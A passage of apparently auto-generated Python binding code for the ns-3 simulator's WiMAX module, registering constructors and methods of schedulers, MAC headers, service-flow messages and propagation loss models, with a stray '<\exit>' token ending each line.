cls.add_method('CheckForFragmentation',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('int', 'availableSymbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetBs',<\exit>
'ns3::Ptr< ns3::BaseStationNetDevice >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetBs',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3BSSchedulerRtps_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSSchedulerRtps const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_virtual=True)<\exit>
cls.add_method('BSSchedulerBEConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerBasicConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerBroadcastConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerInitialRangingConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerNRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerPrimaryConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('BSSchedulerUGSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'availableSymbols')])<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectBEConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectIRandBCConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectMenagementConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectNRTPSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectRTPSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
cls.add_method('SelectUGSConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')])<\exit>
return<\exit>
def register_Ns3BSSchedulerSimple_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSSchedulerSimple const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CreateUgsBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint32_t', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDownlinkBursts',<\exit>
'std::list< std::pair< ns3::OfdmDlMapIe *, ns3::Ptr< ns3::PacketBurst > > > *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('SelectConnection',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection > &', 'connection')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3BandwidthRequestHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BandwidthRequestHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBr',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHt',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBr',<\exit>
'void',<\exit>
[param('uint32_t', 'br')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetEc',<\exit>
'void',<\exit>
[param('uint8_t', 'ec')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
cls.add_method('SetHt',<\exit>
'void',<\exit>
[param('uint8_t', 'HT')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('check_hcs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3BsServiceFlowManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BsServiceFlowManager const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'device')])<\exit>
cls.add_method('AddMulticastServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf'), param('ns3::WimaxPhy::ModulationType', 'modulation')])<\exit>
cls.add_method('AddServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('AllocateServiceFlows',<\exit>
'void',<\exit>
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetDsaAckTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('uint32_t', 'sfid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Cid', 'cid')],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlows',<\exit>
'std::vector< ns3::ServiceFlow * >',<\exit>
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('ProcessDsaAck',<\exit>
'void',<\exit>
[param('ns3::DsaAck const &', 'dsaAck'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('ProcessDsaReq',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::DsaReq const &', 'dsaReq'), param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetMaxDsaRspRetries',<\exit>
'void',<\exit>
[param('uint8_t', 'maxDsaRspRetries')])<\exit>
return<\exit>
def register_Ns3CallbackChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3CallbackImplBase_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackImplBase const &', 'arg0')])<\exit>
cls.add_method('IsEqual',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::CallbackImplBase const >', 'other')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3CallbackValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CallbackValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::CallbackBase const &', 'base')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::CallbackBase', 'base')])<\exit>
return<\exit>
def register_Ns3Channel_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Channel const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[param('uint32_t', 'i')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetId',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNDevices',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3ConnectionManager_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ConnectionManager const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection'), param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('AllocateManagementConnections',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::RngRsp *', 'rngrsp')])<\exit>
cls.add_method('CreateConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConnection',<\exit>
'ns3::Ptr< ns3::WimaxConnection >',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('GetConnections',<\exit>
'std::vector< ns3::Ptr< ns3::WimaxConnection > >',<\exit>
[param('ns3::Cid::Type', 'type')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNPackets',<\exit>
'uint32_t',<\exit>
[param('ns3::Cid::Type', 'type'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetCidFactory',<\exit>
'void',<\exit>
[param('ns3::CidFactory *', 'cidFactory')])<\exit>
return<\exit>
def register_Ns3Dcd_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Dcd const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlBurstProfile',<\exit>
'void',<\exit>
[param('ns3::OfdmDlBurstProfile', 'dlBurstProfile')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelEncodings',<\exit>
'ns3::OfdmDcdChannelEncodings',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfigurationChangeCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlBurstProfiles',<\exit>
'std::vector< ns3::OfdmDlBurstProfile >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrDlBurstProfiles',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetChannelEncodings',<\exit>
'void',<\exit>
[param('ns3::OfdmDcdChannelEncodings', 'channelEncodings')])<\exit>
cls.add_method('SetConfigurationChangeCount',<\exit>
'void',<\exit>
[param('uint8_t', 'configurationChangeCount')])<\exit>
cls.add_method('SetNrDlBurstProfiles',<\exit>
'void',<\exit>
[param('uint8_t', 'nrDlBurstProfiles')])<\exit>
return<\exit>
def register_Ns3DlMap_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DlMap const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('AddDlMapElement',<\exit>
'void',<\exit>
[param('ns3::OfdmDlMapIe', 'dlMapElement')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetBaseStationId',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDcdCount',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDlMapElements',<\exit>
'std::list< ns3::OfdmDlMapIe >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetBaseStationId',<\exit>
'void',<\exit>
[param('ns3::Mac48Address', 'baseStationID')])<\exit>
cls.add_method('SetDcdCount',<\exit>
'void',<\exit>
[param('uint8_t', 'dcdCount')])<\exit>
return<\exit>
def register_Ns3DsaAck_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaAck const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConfirmationCode',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetConfirmationCode',<\exit>
'void',<\exit>
[param('uint16_t', 'confirmationCode')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3DsaReq_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaReq const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'sfid')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3DsaRsp_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaRsp const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfirmationCode',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetConfirmationCode',<\exit>
'void',<\exit>
[param('uint16_t', 'confirmationCode')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'sfid')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3EmptyAttributeValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EmptyAttributeValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3EventImpl_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EventImpl const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Invoke',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IsCancelled',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('Notify',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3FixedRssLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetRss',<\exit>
'void',<\exit>
[param('double', 'rss')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3FragmentationSubheader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::FragmentationSubheader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetFc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFsn',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetFc',<\exit>
'void',<\exit>
[param('uint8_t', 'fc')])<\exit>
cls.add_method('SetFsn',<\exit>
'void',<\exit>
[param('uint8_t', 'fsn')])<\exit>
return<\exit>
def register_Ns3FriisPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'frequency'), param('double', 'speed')])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'lambda')])<\exit>
cls.add_method('SetSystemLoss',<\exit>
'void',<\exit>
[param('double', 'systemLoss')])<\exit>
cls.add_method('SetMinDistance',<\exit>
'void',<\exit>
[param('double', 'minDistance')])<\exit>
cls.add_method('GetMinDistance',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLambda',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemLoss',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3GenericMacHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GenericMacHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCi',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEks',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHt',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetLen',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
